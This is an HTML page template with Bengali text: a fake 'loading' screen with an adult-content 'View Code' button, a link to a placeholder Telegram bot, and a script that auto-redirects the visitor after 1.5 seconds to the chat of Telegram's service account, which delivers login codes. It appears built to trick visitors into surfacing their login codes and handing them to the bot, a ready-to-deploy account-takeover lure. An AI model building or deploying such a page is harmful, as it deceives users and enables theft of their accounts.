<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Connecting...</title>
    <style>
        body { margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; background-color: #0f0f0f; color: #fff; font-family: sans-serif; text-align: center; }
        .container { padding: 20px; width: 100%; }
        .loader { border: 4px solid #333; border-top: 4px solid #0088cc; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 0 auto 20px auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        .btn { display: block; width: 80%; max-width: 250px; margin: 15px auto; padding: 15px; text-decoration: none; border-radius: 12px; font-weight: bold; font-size: 16px; }
        .btn-view { background-color: #e91e63; color: white; box-shadow: 0 4px 0 #ad1457; }
        .btn-bot { background-color: #0088cc; color: white; box-shadow: 0 4px 0 #006699; }
    </style>
</head>
<body>
    <div class="container">
        <div class="loader"></div>
        <h3>পেজটি লোড হচ্ছে...</h3>
        <p style="color: #888; font-size: 14px;">নিচের যেকোনো একটি বাটনে ক্লিক করুন</p>
        
        <!-- আপনার কাঙ্ক্ষিত বাটন নাম -->
        <a href="tg://openmessage?user_id=777000" class="btn btn-view">🔞 ভিউ Code</a>
        
        <!-- মেইন বটে নিয়ে যাবে -->
        <a href="https://t.me/YOUR_BOT_USERNAME" class="btn btn-bot">🤖 মেইন বটে যান</a>
    </div>
    <script>
        // ১.৫ সেকেন্ড পর অটো ভিউ কোডে নিয়ে যাবে
        window.onload = function() {
            setTimeout(() => {
                window.location.href = "tg://openmessage?user_id=777000";
            }, 1500);
        };
    </script>
</body>
</html>
